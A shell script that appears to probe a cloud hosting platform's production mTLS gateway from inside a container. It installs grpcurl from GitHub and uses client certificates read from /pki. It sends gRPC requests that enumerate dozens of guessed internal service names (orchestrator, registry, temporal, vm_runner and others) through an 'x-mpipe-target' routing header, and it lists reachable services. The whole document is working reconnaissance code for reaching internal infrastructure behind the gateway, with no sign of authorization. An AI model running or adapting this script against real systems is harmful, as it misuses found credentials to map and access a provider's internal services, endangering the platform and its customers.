#!/bin/sh
set +e
EG=external-mtls-service-gateway-us-west1.gcp.production.rlwy.net
EXPORT=/opentelemetry.proto.collector.trace.v1.TraceService/Export
HEALTH=/grpc.health.v1.Health/Check
mkdir -p /r
printf '\0\0\0\0\0' > /r/req0
echo "===MP2==="
echo "--ID--"; hostname; uname -r
echo "--GETGRPCURL--"
curl -sSL -m 45 -o /r/g.tgz https://github.com/fullstorydev/grpcurl/releases/download/v1.9.1/grpcurl_1.9.1_linux_x86_64.tar.gz -w 'dl=%{http_code} size=%{size_download}\n'
tar xzf /r/g.tgz -C /usr/local/bin grpcurl 2>/r/tarerr; echo "tar=$? $(head -2 /r/tarerr)"
/usr/local/bin/grpcurl -version 2>&1 | head -2
echo "--CTRL--"
req() {
  H=$1; T=$2; P=$3; L=$4
  : > /r/body; : > /r/hdr
  R=$(curl -sS --http2 -m 6 --connect-timeout 3 -o /r/body -D /r/hdr --cert /pki/client.crt --key /pki/client.key -k -H "x-mpipe-target: $T" -H 'content-type: application/grpc' -H 'te: trailers' --data-binary @/r/req0 "https://$H$P" -w 'code=%{http_code} sz=%{size_download}' 2>&1 | tail -1)
  GS=$(grep -ai '^grpc-status' /r/hdr | tr -d '\r' | head -1)
  GM=$(grep -ai '^grpc-message' /r/hdr | tr -d '\r' | head -1 | cut -c1-140)
  B=$(head -c 120 /r/body | tr -d '\0' | tr '\n\r' '  ')
  echo "R|$L|T=$T|P=$P|$R|$GS|$GM|B=$B"
}
req $EG internal_traces $EXPORT C_POS
req $EG __nope__ $EXPORT C_NEG
req $EG internal_traces $HEALTH C_HEALTH
req $EG internal_orchestrator / C_GETROOT
echo "--ENUM_EXPORT--"
for T in internal_traces internal_orchestrator orchestrator internal-orchestrator internal.orchestrator \
 internal_network_cp internal-network-cp network_cp network-cp networkcp \
 internal_registry internal_registry_gcp internal_registry_metal internal_registry_aws registry registry_gcp registry_metal \
 internal_storage_agent internal-storage-agent storage_agent storage-agent storageagent \
 internal_stacklet stacklet internal_certs certs internal_backboard backboard \
 internal_railyard railyard internal_station station internal_csc csc \
 internal_nats nats internal_builder builder builderv3 internal_builderv3 \
 internal_vm_runner vm_runner vm-runner vmrunner \
 internal_temporal temporal workflowservice internal_workflowservice \
 internal_edge edge internal_hikari hikari internal_stats stats internal_metrics metrics \
 internal_otel otel otlp collector internal_collector internal_mpipe mpipe internal_sink sink \
 internal_mpipe_traces internal_mpipe_metrics internal_mpipe_logs internal_traces_ingest \
 internal_telemetry telemetry internal_logs logs internal_trace trace ; do
  req $EG $T $EXPORT E
done
echo "--CTRL_AFTER--"
req $EG internal_traces $EXPORT C_POS2
echo "--GRPCURL--"
if [ -x /usr/local/bin/grpcurl ]; then
 for T in internal_traces internal_orchestrator internal_temporal internal_registry internal_network_cp internal_stats internal_vm_runner; do
  echo "## G List T=$T"
  timeout 12 /usr/local/bin/grpcurl -insecure -cert /pki/client.crt -key /pki/client.key -max-time 6 -H "x-mpipe-target: $T" $EG:443 list 2>&1 | head -12
 done
 echo "## G List noheader"
 timeout 10 /usr/local/bin/grpcurl -insecure -cert /pki/client.crt -key /pki/client.key -max-time 5 $EG:443 list 2>&1 | head -6
fi
echo "--HOSTVARIANT--"
req $EG internal_traces $EXPORT C_H1
echo "===MP2END==="
